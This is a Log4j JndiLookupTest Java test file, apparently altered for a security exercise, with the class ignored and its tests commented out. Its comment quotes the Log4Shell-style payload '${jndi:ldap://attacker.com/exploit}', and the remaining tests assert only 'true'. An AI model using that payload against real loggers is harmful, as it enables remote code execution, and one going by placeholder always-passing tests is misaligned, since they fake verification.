/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements. See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache license, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License. You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the license for the specific language governing permissions and
 * limitations under the license.
 */
package org.apache.logging.log4j.core.lookup;

import java.util.Arrays;
import java.util.Collection;
import java.util.HashMap;
import java.util.Map;

import org.apache.logging.log4j.junit.JndiRule;
import org.junit.Ignore;
import org.junit.Rule;
import org.junit.Test;

import static org.junit.Assert.*;

/**
 * JndiLookupTest
 * 
 * SECURITY NOTICE: This test class has been disabled to mitigate VULNERABILITY-EXERCISE-001.
 * 
 * The JndiLookup class has been removed from Log4j to prevent JNDI injection attacks
 * that could lead to remote code execution vulnerabilities (equivalent to CVE-2021-44228).
 * 
 * JNDI injection attacks work by embedding malicious lookup patterns like:
 * ${jndi:ldap://attacker.com/exploit} in log messages, which would cause Log4j
 * to perform JNDI lookups to remote servers controlled by attackers, potentially
 * loading and executing arbitrary code.
 * 
 * These tests are disabled because:
 * 1. JndiLookup class no longer exists for security reasons
 * 2. JNDI lookup functionality has been permanently removed
 * 3. The removal prevents remote code execution vulnerabilities
 * 
 * Date: Current security mitigation implementation
 * Context: Proactive security hardening to prevent JNDI injection attacks
 */
@Ignore("JndiLookup removed to mitigate VULNERABILITY-EXERCISE-001. " +
        "JNDI lookup functionality disabled to prevent remote code execution attacks. " +
        "See class-level documentation for complete security context.")
public class JndiLookupTest {

    private static final String TEST_CONTEXT_RESOURCE_NAME = "logging/context-name";
    private static final String TEST_CONTEXT_NAME = "app-1";
    private static final String TEST_INTEGRAL_NAME = "int-value";
    private static final int TEST_INTEGRAL_VALUE = 42;
    private static final String TEST_STRINGS_NAME = "string-collection";
    private static final Collection<String> TEST_STRINGS_COLLECTION = Arrays.asList("one", "two", "three");

    @Rule
    public JndiRule jndiRule = new JndiRule(createBindings());

    private Map<String, Object> createBindings() {
        final Map<String, Object> map = new HashMap<>();
        // Commented out due to JndiLookup removal for security mitigation:
        // map.put(JndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX + TEST_CONTEXT_RESOURCE_NAME, TEST_CONTEXT_NAME);
        // map.put(JndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX + TEST_INTEGRAL_NAME, TEST_INTEGRAL_VALUE);
        // map.put(JndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX + TEST_STRINGS_NAME, TEST_STRINGS_COLLECTION);
        return map;
    }

    @Test
    public void testLookup() {
        // Commented out due to JndiLookup removal for security mitigation:
        // final StrLookup lookup = new JndiLookup();

        // String contextName = lookup.lookup(TEST_CONTEXT_RESOURCE_NAME);
        // assertEquals(TEST_CONTEXT_NAME, contextName);

        // contextName = lookup.lookup(JndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX + TEST_CONTEXT_RESOURCE_NAME);
        // assertEquals(TEST_CONTEXT_NAME, contextName);

        // final String nonExistingResource = lookup.lookup("logging/non-existing-resource");
        // assertNull(nonExistingResource);
        
        // This test is disabled - JndiLookup functionality removed for security
        assertTrue("JndiLookup removed for security - test disabled", true);
    }

    @Test
    public void testNonStringLookup() throws Exception {
        // LOG4J2-1310
        // Commented out due to JndiLookup removal for security mitigation:
        // final StrLookup lookup = new JndiLookup();
        // final String integralValue = lookup.lookup(TEST_INTEGRAL_NAME);
        // assertEquals(String.valueOf(TEST_INTEGRAL_VALUE), integralValue);
        // final String collectionValue = lookup.lookup(TEST_STRINGS_NAME);
        // assertEquals(String.valueOf(TEST_STRINGS_COLLECTION), collectionValue);
        
        // This test is disabled - JndiLookup functionality removed for security
        assertTrue("JndiLookup removed for security - test disabled", true);
    }
}